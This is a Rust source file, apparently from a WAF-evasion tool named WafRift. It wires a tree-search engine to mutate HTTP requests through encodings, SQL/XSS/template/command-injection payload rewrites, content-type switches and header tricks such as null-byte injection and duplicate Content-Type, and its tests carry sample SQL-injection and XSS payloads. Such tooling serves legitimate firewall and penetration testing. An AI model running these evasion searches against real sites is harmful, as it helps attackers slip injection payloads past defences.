//! Bridge connecting the abstract Monte Carlo Tree Search framework to `WafRift`'s concrete HTTP Request types.
//!
//! # Multi-dimensional action space
//!
//! Unlike earlier versions that only explored encoding strategies, this bridge
//! exposes the **full combinatorial evasion space** to MCTS:
//!
//! | Dimension | Actions | Impact |
//! |---|---|---|
//! | Encoding strategies | 14 types (URL, double-URL, unicode, etc.) | Keyword bypass |
//! | Grammar mutations | SQL/XSS/CMDI/SSTI/path semantic transforms | Structure bypass |
//! | Content-Type switching | Multipart, JSON, XML variants | Parser confusion |
//! | Header obfuscation | Case mixing, tab separators | Header rule bypass |
//!
//! The MCTS tree searches through multi-step paths across ALL dimensions,
//! discovering combinations like "unicode-encode → switch to multipart →
//! grammar-mutate SQL" that no static escalation would find.

use mctrust::{Environment, Outcome, Reward};
use wafrift_encoding::encoding;
use wafrift_grammar::grammar;
use wafrift_types::{Request, Technique};

/// A concrete action representing a single evasion technique applied to a payload.
///
/// Each variant maps to a different evasion dimension that the MCTS tree
/// can explore. Actions are composable — applying encoding after grammar
/// mutation is a valid 2-step path.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum TechniqueAction {
    /// Apply a payload encoding strategy (URL, unicode, case alternation, etc.).
    Encode(String),
    /// Apply a grammar-aware mutation (SQL tautology swap, XSS tag rotation, etc.).
    GrammarMutate(String),
    /// Switch Content-Type (multipart, JSON unicode, XML CDATA, etc.).
    ContentTypeSwitch(String),
    /// Apply header obfuscation (case mixing).
    HeaderTrick(String),
}

impl TechniqueAction {
    /// Convert this action into the corresponding [`Technique`] for tracking.
    #[must_use]
    pub fn to_technique(&self) -> Technique {
        match self {
            Self::Encode(name) => Technique::PayloadEncoding(name.clone()),
            Self::GrammarMutate(name) => Technique::GrammarMutation(name.clone()),
            Self::ContentTypeSwitch(name) => Technique::ContentTypeSwitch(name.clone()),
            Self::HeaderTrick(name) => Technique::HeaderObfuscation(name.clone()),
        }
    }
}

/// The local simulation environment for `WafRift` evasion paths.
///
/// Wraps an in-flight HTTP request and the sequence of techniques applied to it.
/// Controls the legal action space to prevent nonsensical combinations
/// (e.g., grammar mutation AFTER encoding, or double content-type switch).
#[derive(Clone)]
pub struct WafRiftEnv {
    /// The current state of the HTTP request.
    pub req: Request,
    /// Strategies that have already mutated this request.
    pub applied_techniques: Vec<Technique>,
    /// Maximum number of compounding transformations before halting.
    pub max_depth: usize,
    /// Cached grammar mutations for the current payload (computed once).
    grammar_mutations: Vec<grammar::GrammarMutation>,
    /// Whether grammar mutation has already been applied this path.
    grammar_applied: bool,
    /// Whether content-type switch has already been applied this path.
    content_type_applied: bool,
    /// Whether header obfuscation has already been applied this path.
    header_applied: bool,
    /// SQL dialect to use for AST validation.
    pub sql_dialect: wafrift_oracle::sql::DatabaseDialect,
}

impl WafRiftEnv {
    /// Create a new environment seeded with a request.
    ///
    /// Pre-computes grammar mutations for the payload body so they're
    /// available instantly during MCTS tree expansion.
    #[must_use]
    pub fn new(req: Request, max_depth: usize) -> Self {
        Self::with_dialect(
            req,
            max_depth,
            wafrift_oracle::sql::DatabaseDialect::Generic,
        )
    }

    /// Create a new environment with a specific SQL dialect.
    #[must_use]
    pub fn with_dialect(
        req: Request,
        max_depth: usize,
        sql_dialect: wafrift_oracle::sql::DatabaseDialect,
    ) -> Self {
        // Pre-compute grammar mutations from the body
        let grammar_mutations = req
            .body
            .as_ref()
            .filter(|_| crate::strategy::is_text_payload(&req))
            .and_then(|body| {
                let body_str = match std::str::from_utf8(body) {
                    Ok(s) => s,
                    Err(e) => {
                        tracing::warn!(error = %e, "MCTS bridge skipped non-UTF-8 body");
                        return None;
                    }
                };
                // Extract parameter values for mutation
                let payload = body_str
                    .split('&')
                    .filter_map(|pair| pair.split_once('=').map(|(_, v)| v))
                    .collect::<Vec<_>>()
                    .join(" ");
                Some(if payload.is_empty() {
                    grammar::mutate(body_str, 8)
                } else {
                    grammar::mutate(&payload, 8)
                })
            })
            .unwrap_or_default();

        Self {
            req,
            applied_techniques: Vec::new(),
            max_depth,
            grammar_mutations,
            grammar_applied: false,
            content_type_applied: false,
            header_applied: false,
            sql_dialect,
        }
    }
}

impl Environment for WafRiftEnv {
    type Action = TechniqueAction;

    fn legal_actions(&self) -> Vec<Self::Action> {
        let mut actions = Vec::new();

        if self.applied_techniques.len() >= self.max_depth {
            return actions;
        }

        // ── Dimension 1: Encoding strategies ──
        for strat in encoding::all_strategies() {
            let tech_name = strat.as_str().to_string();
            // Prevent duplicate adjacent encodings of the exact same type
            if let Some(Technique::PayloadEncoding(last)) = self.applied_techniques.last()
                && last == &tech_name
            {
                continue;
            }
            actions.push(TechniqueAction::Encode(tech_name));
        }

        // ── Dimension 2: Grammar mutations (only once per path) ──
        if !self.grammar_applied {
            for mutation in &self.grammar_mutations {
                let desc = mutation.rules_applied.first().copied().unwrap_or("grammar");
                actions.push(TechniqueAction::GrammarMutate(desc.to_string()));
            }
        }

        // ── Dimension 3: Content-Type switching (only once per path) ──
        if !self.content_type_applied
            && let Some(ref body) = self.req.body
            && crate::strategy::is_text_payload(&self.req)
        {
            // F115: parse_form_body returns Result; treat oversized /
            // unparseable as "no params" for action-list enumeration.
            let params = wafrift_content_type::parse_form_body(body).unwrap_or_default();
            if !params.is_empty() {
                actions.push(TechniqueAction::ContentTypeSwitch("Multipart".to_string()));
                actions.push(TechniqueAction::ContentTypeSwitch(
                    "JsonUnicodeEscape".to_string(),
                ));
                actions.push(TechniqueAction::ContentTypeSwitch("XmlCdata".to_string()));
                actions.push(TechniqueAction::ContentTypeSwitch(
                    "MultipartQuotedBoundary".to_string(),
                ));
            }
        }

        // ── Dimension 4: Header obfuscation (only once per path) ──
        // Audit (2026-05-10): pre-fix this hardcoded "CaseMixing" so
        // the MCTS search could only ever pick that one header trick,
        // even though the engine ships TabSeparator, WhitespacePadding,
        // LineFolding, DuplicateHeader, UnderscoreSubstitution,
        // NullByteInjection, TrailingSpace, MultiLineFolding, CommaJoin,
        // and others. Restricting the action space to a single name
        // defeats the search. Now we expose every known header trick
        // as a distinct action so MCTS can actually choose between
        // them.
        if !self.header_applied {
            // Only expose tricks the apply() arm can actually execute
            // on the structured Vec<(name, value)> the proxy hands
            // to reqwest. Wire-format-only tricks (TabSeparator,
            // WhitespacePadding, LineFolding, LfOnlyLineFolding,
            // MultiLineFolding, LfOnlyMultiLineFolding, TrailingSpace,
            // CommaJoin) produce headers reqwest re-normalises, so
            // exposing them here would let MCTS waste budget on
            // actions that fabricate "success" without changing the
            // wire bytes. Those belong in transport-level
            // serialisation, not strategy-level planning.
            //
            // Pre-fix the apply() arm ignored the trick name and ran
            // case_mix unconditionally — every choice MCTS made was
            // identical at execution and the search couldn't learn
            // ANY ordering among header tricks.
            for trick in [
                "CaseMixing",
                "UnderscoreSubstitution",
                "NullByteInjection",
                "DuplicateHeader",
            ] {
                actions.push(TechniqueAction::HeaderTrick(trick.to_string()));
            }
        }

        actions
    }

    fn apply(&mut self, action: &Self::Action) {
        self.applied_techniques.push(action.to_technique());

        match action {
            TechniqueAction::Encode(encoding_name) => {
                if let Some(strategy) = encoding::all_strategies()
                    .iter()
                    .copied()
                    .find(|s| s.as_str() == *encoding_name)
                    && let Some(ref body) = self.req.body
                    && crate::strategy::is_text_payload(&self.req)
                {
                    // If the encoding fails (rare — typically only on the
                    // synthetic strategies that require body shapes the
                    // current request does not have), skip silently rather
                    // than panic the whole MCTS rollout. The action gets
                    // negative feedback via the WAF block-or-not, so the
                    // tree learns to avoid this combination.
                    if let Ok(encoded) = encoding::encode(body.as_slice(), strategy) {
                        self.req.body = Some(encoded.into_bytes());
                    }
                }
            }
            TechniqueAction::GrammarMutate(rule_name) => {
                // Find the matching pre-computed mutation
                if let Some(mutation) = self
                    .grammar_mutations
                    .iter()
                    .find(|m| m.rules_applied.first().copied() == Some(rule_name.as_str()))
                {
                    // Apply grammar mutation to the body
                    if let Some(ref body) = self.req.body
                        && crate::strategy::is_text_payload(&self.req)
                    {
                        let Ok(body_str) = std::str::from_utf8(body) else {
                            return;
                        };
                        // Replace only the first parameter value while preserving
                        // the rest of the form body so the request remains valid.
                        if let Some((first_pair, rest)) = body_str.split_once('&') {
                            if let Some((key, _value)) = first_pair.split_once('=') {
                                let new_body = format!("{key}={}&{rest}", mutation.payload);
                                self.req.body = Some(new_body.into_bytes());
                            }
                        } else if let Some((key, _value)) = body_str.split_once('=') {
                            let new_body = format!("{key}={}", mutation.payload);
                            self.req.body = Some(new_body.into_bytes());
                        } else {
                            self.req.body = Some(mutation.payload.clone().into_bytes());
                        }
                    }
                }
                self.grammar_applied = true;
            }
            TechniqueAction::ContentTypeSwitch(technique_name) => {
                if let Some(ref body) = self.req.body
                    && crate::strategy::is_text_payload(&self.req)
                {
                    // F115: parse_form_body now returns Result; an
                    // oversized / unparseable body for the content-type
                    // switch means "no params to switch on" — fall
                    // through rather than erroring the whole MCTS step.
                    let params = wafrift_content_type::parse_form_body(body)
                        .unwrap_or_default();
                    if !params.is_empty() {
                        let variants = wafrift_content_type::generate_variants(&params);
                        if let Some(variant) = variants
                            .into_iter()
                            .find(|v| format!("{:?}", v.technique) == *technique_name)
                        {
                            self.req
                                .headers
                                .retain(|(k, _)| !k.eq_ignore_ascii_case("content-type"));
                            self.req
                                .headers
                                .push(("Content-Type".into(), variant.content_type));
                            self.req.body = Some(variant.body);
                        }
                    }
                }
                self.content_type_applied = true;
            }
            TechniqueAction::HeaderTrick(trick_name) => {
                // Dispatch on the trick name so MCTS-chosen actions
                // actually do what they say. Pre-fix this discarded
                // the trick_name and ran case_mix every time — 11
                // of 12 advertised tricks were silent no-ops.
                // legal_actions() above only exposes the 4 tricks
                // that survive the structured (name, value) → reqwest
                // round-trip; the wire-only tricks (TabSeparator,
                // line folding, etc.) live in transport.
                if let Some(ct_idx) = self
                    .req
                    .headers
                    .iter()
                    .position(|(k, _)| k.eq_ignore_ascii_case("content-type"))
                {
                    let (name, value) = self.req.headers[ct_idx].clone();
                    match trick_name.as_str() {
                        "CaseMixing" => {
                            self.req.headers[ct_idx] =
                                (wafrift_encoding::header::case_mix("Content-Type"), value);
                        }
                        "UnderscoreSubstitution" => {
                            // Some legacy WAFs treat - and _ as
                            // equivalent in header names; many CGI
                            // backends do too. Pairing them lets the
                            // WAF normalise away the mutation while
                            // the origin still sees the variant.
                            self.req.headers[ct_idx] = (
                                wafrift_encoding::header::underscore_substitute(&name),
                                value,
                            );
                        }
                        "NullByteInjection" => {
                            self.req.headers[ct_idx] =
                                (wafrift_encoding::header::null_byte_inject(&name), value);
                        }
                        "DuplicateHeader" => {
                            // Push a SECOND Content-Type entry with
                            // an alternate benign value — some
                            // intermediaries take the first, others
                            // the last (CL+TE-style desync at the
                            // header level).
                            self.req
                                .headers
                                .push((name.clone(), "text/plain".to_string()));
                        }
                        _ => {
                            // Unrecognised trick — fall back to
                            // case-mix rather than no-op, so a
                            // future trick added to legal_actions
                            // without an apply() arm still produces
                            // SOME mutation rather than fabricating
                            // a no-op "success".
                            self.req.headers[ct_idx] =
                                (wafrift_encoding::header::case_mix("Content-Type"), value);
                        }
                    }
                }
                self.header_applied = true;
            }
        }
    }

    fn evaluate(&self) -> Outcome {
        // Multi-oracle validation: classify the payload type and validate
        // with the appropriate oracle.
        if !self.applied_techniques.is_empty()
            && let Some(ref body) = self.req.body
            && crate::strategy::is_text_payload(&self.req)
        {
            let body_str = match std::str::from_utf8(body) {
                Ok(s) => s,
                Err(_) => return Outcome::Failure,
            };

            for pair in body_str.split('&') {
                if let Some((_, v)) = pair.split_once('=') {
                    // Decode percent-encoding so AST parsers can see the
                    // underlying structure through evasion layers.
                    let decoded = urlencoding::decode(v)
                        .unwrap_or_else(|_| v.into())
                        .into_owned();

                    // Classify and validate with the appropriate oracle
                    let payload_type = grammar::classify(&decoded);
                    match payload_type {
                        grammar::PayloadType::Sql => {
                            // SQL validation via AST parser
                            let looks_like_sql = decoded.contains('\'')
                                || decoded.contains('=')
                                || decoded.contains("--");
                            if looks_like_sql
                                && !wafrift_oracle::sql::is_valid_expression_injection(
                                    &decoded,
                                    self.sql_dialect,
                                )
                            {
                                return Outcome::Failure;
                            }
                        }
                        grammar::PayloadType::Xss => {
                            // XSS structural validation
                            use wafrift_oracle::traits::PayloadOracle;
                            let oracle = wafrift_oracle::xss::XssOracle;
                            if !oracle.is_semantically_valid(&decoded, &decoded) {
                                return Outcome::Failure;
                            }
                        }
                        grammar::PayloadType::TemplateInjection => {
                            use wafrift_oracle::traits::PayloadOracle;
                            let oracle = wafrift_oracle::ssti::SstiOracle;
                            if !oracle.is_semantically_valid(&decoded, &decoded) {
                                return Outcome::Failure;
                            }
                        }
                        grammar::PayloadType::CommandInjection => {
                            use wafrift_oracle::traits::PayloadOracle;
                            let oracle = wafrift_oracle::cmdi::CmdiOracle;
                            if !oracle.is_semantically_valid(&decoded, &decoded) {
                                return Outcome::Failure;
                            }
                        }
                        grammar::PayloadType::PathTraversal => {
                            use wafrift_oracle::traits::PayloadOracle;
                            let oracle = wafrift_oracle::path::PathOracle;
                            if !oracle.is_semantically_valid(&decoded, &decoded) {
                                return Outcome::Failure;
                            }
                        }
                        // Unknown/LDAP/SSRF: no oracle available, accept the transform
                        _ => {}
                    }
                }
            }
        }

        // Score based on depth and diversity of techniques
        if self.applied_techniques.len() >= self.max_depth {
            // Higher reward for more diverse technique combinations
            let diversity = technique_diversity(&self.applied_techniques);
            Outcome::Success(Reward::new(0.5 + diversity * 0.5))
        } else {
            Outcome::Ongoing
        }
    }

    fn max_depth(&self) -> Option<usize> {
        Some(self.max_depth)
    }
}

/// Calculate technique diversity score (0.0–1.0).
///
/// Higher diversity = better evasion (multi-dimensional transforms
/// are harder for WAFs to handle than single-dimension transforms).
fn technique_diversity(techniques: &[Technique]) -> f64 {
    if techniques.is_empty() {
        return 0.0;
    }

    let mut has_encoding = false;
    let mut has_grammar = false;
    let mut has_content_type = false;
    let mut has_header = false;

    for tech in techniques {
        match tech {
            Technique::PayloadEncoding(_) => has_encoding = true,
            Technique::GrammarMutation(_) => has_grammar = true,
            Technique::ContentTypeSwitch(_) => has_content_type = true,
            Technique::HeaderObfuscation(_) => has_header = true,
            _ => {}
        }
    }

    let dimensions_used = u32::from(has_encoding)
        + u32::from(has_grammar)
        + u32::from(has_content_type)
        + u32::from(has_header);

    // 4 possible dimensions
    f64::from(dimensions_used) / 4.0
}

#[cfg(test)]
mod tests {
    use super::*;
    use mctrust::{SearchConfig, TreeSearch};

    #[test]
    fn mcts_bridge_finds_encoding_technique() {
        let req = Request::post(
            "http://example.com/login",
            b"user=admin' OR '1'='1".to_vec(),
        );
        let env = WafRiftEnv::new(req, 2);

        let config = SearchConfig::builder()
            .iterations(100)
            .exploration_constant(1.41)
            .max_depth(2)
            .build();

        let mut engine = TreeSearch::new(env, config);
        let optimal_action = engine.run();

        assert!(
            optimal_action.is_some(),
            "MCTS should discover at least one valid progression"
        );
    }

    #[test]
    fn action_space_includes_multiple_dimensions() {
        let req = Request::post("http://example.com/search", b"q=admin' OR 1=1--".to_vec());
        let env = WafRiftEnv::new(req, 3);
        let actions = env.legal_actions();

        let has_encoding = actions
            .iter()
            .any(|a| matches!(a, TechniqueAction::Encode(_)));
        let has_grammar = actions
            .iter()
            .any(|a| matches!(a, TechniqueAction::GrammarMutate(_)));
        let has_content_type = actions
            .iter()
            .any(|a| matches!(a, TechniqueAction::ContentTypeSwitch(_)));
        let has_header = actions
            .iter()
            .any(|a| matches!(a, TechniqueAction::HeaderTrick(_)));

        assert!(has_encoding, "action space must include encoding");
        assert!(has_grammar, "action space must include grammar mutations");
        assert!(
            has_content_type,
            "action space must include content-type switching"
        );
        assert!(has_header, "action space must include header tricks");
    }

    #[test]
    fn grammar_only_applied_once() {
        let req = Request::post("http://example.com/search", b"q=admin' OR 1=1--".to_vec());
        let mut env = WafRiftEnv::new(req, 4);

        // Apply a grammar mutation
        let grammar_action = env
            .legal_actions()
            .into_iter()
            .find(|a| matches!(a, TechniqueAction::GrammarMutate(_)))
            .expect("expected at least one grammar action for SQL-like payload");

        env.apply(&grammar_action);

        // Grammar mutations should no longer be in the action space
        let actions = env.legal_actions();
        let has_grammar = actions
            .iter()
            .any(|a| matches!(a, TechniqueAction::GrammarMutate(_)));
        assert!(
            !has_grammar,
            "grammar mutations should only be available once per path"
        );
    }

    #[test]
    fn content_type_only_applied_once() {
        let req = Request::post("http://example.com/search", b"q=test".to_vec());
        let mut env = WafRiftEnv::new(req, 4);

        let ct_action = env
            .legal_actions()
            .into_iter()
            .find(|a| matches!(a, TechniqueAction::ContentTypeSwitch(_)))
            .expect("expected at least one content-type action for form body");

        env.apply(&ct_action);
        let actions = env.legal_actions();
        let has_ct = actions
            .iter()
            .any(|a| matches!(a, TechniqueAction::ContentTypeSwitch(_)));
        assert!(
            !has_ct,
            "content-type switch should only be available once per path"
        );
    }

    #[test]
    fn technique_diversity_scoring() {
        assert!((technique_diversity(&[]) - 0.0).abs() < f64::EPSILON);

        let single = vec![Technique::PayloadEncoding("test".into())];
        assert!((technique_diversity(&single) - 0.25).abs() < f64::EPSILON);

        let dual = vec![
            Technique::PayloadEncoding("test".into()),
            Technique::GrammarMutation("sql".into()),
        ];
        assert!((technique_diversity(&dual) - 0.5).abs() < f64::EPSILON);

        let triple = vec![
            Technique::PayloadEncoding("test".into()),
            Technique::GrammarMutation("sql".into()),
            Technique::ContentTypeSwitch("json".into()),
        ];
        assert!((technique_diversity(&triple) - 0.75).abs() < f64::EPSILON);
    }

    #[test]
    fn multi_step_mcts_explores_combinations() {
        let req = Request::post(
            "http://example.com/login",
            b"user=admin' OR '1'='1".to_vec(),
        );
        let env = WafRiftEnv::new(req, 3);

        let config = SearchConfig::builder()
            .iterations(200)
            .exploration_constant(1.41)
            .max_depth(3)
            .build();

        let mut engine = TreeSearch::new(env, config);
        let result = engine.run();
        assert!(result.is_some(), "MCTS should find a multi-step path");
    }

    #[test]
    fn to_technique_conversion() {
        let encode = TechniqueAction::Encode("UrlEncode".into());
        assert!(matches!(
            encode.to_technique(),
            Technique::PayloadEncoding(_)
        ));

        let grammar = TechniqueAction::GrammarMutate("tautology_swap".into());
        assert!(matches!(
            grammar.to_technique(),
            Technique::GrammarMutation(_)
        ));

        let ct = TechniqueAction::ContentTypeSwitch("Multipart".into());
        assert!(matches!(ct.to_technique(), Technique::ContentTypeSwitch(_)));

        let header = TechniqueAction::HeaderTrick("CaseMixing".into());
        assert!(matches!(
            header.to_technique(),
            Technique::HeaderObfuscation(_)
        ));
    }

    #[test]
    fn xss_payload_uses_xss_oracle() {
        let req = Request::post(
            "http://example.com/comment",
            b"msg=<script>alert(1)</script>".to_vec(),
        );
        let env = WafRiftEnv::new(req, 2);

        let config = SearchConfig::builder()
            .iterations(100)
            .exploration_constant(1.41)
            .max_depth(2)
            .build();

        let mut engine = TreeSearch::new(env, config);
        // Should not panic; XSS oracle is used for validation
        let _ = engine.run();
    }

    // ── HeaderTrick dispatch (F42 regression) ─────────────────

    fn req_with_ct() -> Request {
        let mut r = Request::post("http://example.com/api", b"hi".to_vec());
        r.headers
            .push(("Content-Type".into(), "application/json".into()));
        r
    }

    #[test]
    fn header_trick_case_mixing_mutates_header_name_case() {
        let mut env = WafRiftEnv::new(req_with_ct(), 4);
        env.apply(&TechniqueAction::HeaderTrick("CaseMixing".into()));
        let (name, _) = env
            .req
            .headers
            .iter()
            .find(|(k, _)| k.eq_ignore_ascii_case("content-type"))
            .expect("CT survives");
        // case_mix mixes upper/lower → at least one char differs
        // from the canonical "Content-Type".
        assert_ne!(name, "Content-Type", "case_mix should mutate case");
    }

    #[test]
    fn header_trick_underscore_substitution_replaces_dash() {
        let mut env = WafRiftEnv::new(req_with_ct(), 4);
        env.apply(&TechniqueAction::HeaderTrick(
            "UnderscoreSubstitution".into(),
        ));
        let header = env.req.headers.iter().find(|(k, _)| k.contains('_'));
        assert!(
            header.is_some(),
            "expected `_` in mutated header name, got headers: {:?}",
            env.req.headers
        );
    }

    #[test]
    fn header_trick_duplicate_header_pushes_second_content_type() {
        let mut env = WafRiftEnv::new(req_with_ct(), 4);
        env.apply(&TechniqueAction::HeaderTrick("DuplicateHeader".into()));
        let ct_count = env
            .req
            .headers
            .iter()
            .filter(|(k, _)| k.eq_ignore_ascii_case("content-type"))
            .count();
        assert_eq!(
            ct_count, 2,
            "DuplicateHeader must push a second Content-Type entry"
        );
    }

    #[test]
    fn header_trick_legal_actions_only_lists_executable_tricks() {
        // Lock the contract: legal_actions must not advertise tricks
        // the apply() dispatcher can't actually execute (was the F42
        // bug — 11 of 12 advertised tricks fell through to case_mix).
        let env = WafRiftEnv::new(req_with_ct(), 4);
        let header_tricks: Vec<String> = env
            .legal_actions()
            .iter()
            .filter_map(|a| match a {
                TechniqueAction::HeaderTrick(name) => Some(name.clone()),
                _ => None,
            })
            .collect();
        // Exactly the 4 names the apply() arm dispatches on.
        for must_have in [
            "CaseMixing",
            "UnderscoreSubstitution",
            "NullByteInjection",
            "DuplicateHeader",
        ] {
            assert!(
                header_tricks.iter().any(|t| t == must_have),
                "missing trick {must_have} — got {header_tricks:?}"
            );
        }
        // Wire-only tricks must NOT be advertised at this layer.
        for must_not in ["TabSeparator", "LineFolding", "WhitespacePadding"] {
            assert!(
                !header_tricks.iter().any(|t| t == must_not),
                "wire-only trick {must_not} should not appear — got {header_tricks:?}"
            );
        }
    }
}
